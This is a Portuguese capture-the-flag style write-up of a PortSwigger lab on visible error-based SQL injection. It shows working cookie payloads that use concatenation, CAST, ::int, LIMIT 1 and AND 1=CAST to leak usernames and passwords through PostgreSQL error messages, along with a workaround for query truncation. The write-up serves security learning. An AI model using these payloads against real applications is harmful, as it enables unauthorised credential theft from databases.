# Lab: Visible error-based SQL injection

## Enunciado (traduzido)

Este lab contém uma vulnerabilidade de SQL injection. A aplicação utiliza um cookie de rastreamento (`TrackingId`) para análise de métricas e executa uma consulta SQL contendo o valor do cookie enviado.

Os resultados da consulta SQL não são retornados na página, porém a aplicação exibe mensagens de erro detalhadas (verbosas) do banco de dados em sua resposta.

O banco de dados contém uma tabela chamada `users`, com colunas chamadas `username` e `password`.

Para resolver o lab, utilize uma injeção SQL baseada em erros visíveis (visible error-based) para extrair a senha do usuário `administrator` e faça login com essa conta.

## O que fiz (Fluxo 1: Minha Linha de Raciocínio)

Iniciamos os testes interceptando o tráfego no Burp Suite e analisando a requisição que envia o cookie `TrackingId`. Para verificar como o backend lida com entradas maliciosas, adicionamos uma aspa simples `'` ao final do valor do cookie para quebrar a consulta. 

Após confirmar que o banco exibe mensagens detalhadas, tentei buscar diretamente a senha da tabela de usuários utilizando operadores de concatenação de strings (`||`):

```http
Cookie: TrackingId=h9pk8p8U3mU43jqp'||(select password from users)||'
```

O banco de dados recusou a execução e retornou o seguinte erro:
`ERROR: more than one row returned by a subquery used as an expression`

**O que aprendi aqui:** O banco reclamou explicitamente que a tabela possui mais de uma linha. O SQL proíbe injetar uma lista de resultados diretamente dentro de uma expressão de concatenação escalar.

Para corrigir essa restrição de linhas, apliquei o `LIMIT 1` para forçar o retorno de apenas um único registro:

```http
Cookie: TrackingId=h9pk8p8U3mU43jqp'||(select password from users limit 1)||'
```

A query rodou perfeitamente e retornou `HTTP 200 OK`. No entanto, como os dados não são exibidos no layout da página, precisamos forçar um erro de conversão de tipo (`CAST`) para fazer o banco cuspir a resposta na tela. 

Tentei converter o resultado para o tipo inteiro (`int`):

```http
Cookie: TrackingId=h9pk8p8U3mU43jqp'||(select cast(password as int) from users limit 1)||'
```

O servidor quebrou, mas apresentou uma mensagem estranha de aspa não finalizada:
`Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'h9pk8p8U3mU43jqp'||(select cast(password as int) from users '. Expected  char`

### Investigando o Truncamento (A Pegadinha do Lab)

Repare que a nossa resposta não foi inteira. O código foi cortado exatamente em `from users `. Para provar que o backend estava limitando fisicamente o tamanho do nosso input, fiz um teste de stress preenchendo o cookie com um comentário de bloco numerado:

```http
TrackingId=h9pk8p8U3mU43jqp'||/*1*2*3*4*5*6*7*8*9*10*11*12*13*14*15*16*17*18*19*20*21*22*23*24*25*26*27*28*29*30******
```

O banco de dados retornou o seguinte erro:
`Unterminated block comment started at position 54 in SQL SELECT * FROM tracking WHERE id = 'h9pk8p8U3mU43jqp'||/*1*2*3*4*5*6*7*8*9*10*11*12*13*14*15*16*'. Expected */ sequence`

**Descoberta crucial:** O backend limpa o buffer passando uma "tesoura" na query final quando ela atinge o limite máximo de caracteres. Qualquer caractere que passe desse limite é descartado, destruindo a sintaxe do SQL antes do comando ser executado.

### O Acerto Definitivo (Otimizando Espaço)

Para fazer o payload caber no espaço útil do buffer, a solução foi remover completamente o ID original do cookie (`h9pk8p8U3mU43jqp`) para economizar preciosos caracteres. 

A partir disso, montei variações curtas e extremamente eficientes que funcionaram perfeitamente:

* **Buscando o Usuário (Sintaxe Tradicional):**
  ```http
  TrackingId='||(select cast(username as int) from users limit 1)||'
  ```
* **Buscando a Senha (Sintaxe Tradicional):**
  ```http
  TrackingId='||(select cast(password as int) from users limit 1)||'
  ```

Também é possível encurtar ainda mais o payload utilizando o operador nativo de conversão do PostgreSQL (`::int`), dispensando a escrita da palavra `CAST`:

* **Buscando o Usuário (Sintaxe Curta do Postgres):**
  ```http
  TrackingId='||(select username::int from users limit 1)||'
  ```
* **Buscando a Senha (Sintaxe Curta do Postgres):**
  ```http
  TrackingId='||(select password::int from users limit 1)||'
  ```

O banco tentou converter as strings das credenciais em número inteiro, falhou violentamente por incompatibilidade de tipo e despejou os dados que precisávamos direto no log de erro:

```text
ERROR: invalid input syntax for type integer: "administrator"
ERROR: invalid input syntax for type integer: "107127y3iqlwvdq557i7"
```

Copiamos a senha e logamos com sucesso.

---

## Fluxo 2: A Abordagem Alternativa (Como o PortSwigger Resolve)

A resolução oficial proposta pela plataforma segue um caminho diferente. Em vez de usar operadores de concatenação (`||`), eles utilizam operadores lógicos booleanos (`AND`) combinados com um operador de comparação matemática (`1=`) para estruturar a query.

### 1. Forçando a Tipagem Booleana

O laboratório injeta o `AND` junto com o `CAST` para disparar o erro:
```http
Cookie: TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
```
Como o PostgreSQL é fortemente tipado, o operador `AND` exige um retorno booleano (`true`/`false`). Como o `CAST` retorna um número inteiro, o banco nega a execução:  
`ERROR: argument of AND must be type boolean, not type integer`

Para corrigir a exigência gramatical do banco, eles adicionam uma comparação lógica (`1=`), tornando a expressão válida:
```http
Cookie: TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
```

### 2. Lidando com o Truncamento e Múltiplas Linhas

Ao tentar buscar dados reais da tabela de usuários usando essa estrutura, o payload estoura o limite de tamanho por causa do ID original do cookie:
```http
Cookie: TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
```
A query sofre o truncamento físico e remove o caractere de comentário `--` do final, quebrando o fechamento das aspas. 

Para limpar o buffer, eles removem o ID do cookie original:
```http
Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
```
Ao enviar, o tamanho fica correto, mas o banco devolve o erro de múltiplas linhas (`more than one row returned...`). Para mitigar isso, eles aplicam a restrição de paginação usando o `LIMIT 1`:

```http
Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```
O erro exibe o usuário `administrator`. Na sequência, alteram o campo para buscar a credencial final:
```http
Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

### Conclusão Comparativa
Ambas as abordagens resolvem os dois grandes problemas do cenário: o limite de tamanho (truncamento) e a restrição de linhas do SQL. No entanto, o método usando concatenação direta (`||`) provou-se ligeiramente mais curto e mais limpa, economizando a necessidade de criar condicionais lógicas artificiais como `1=`.

---

[⬅ Voltar](../../../README.md)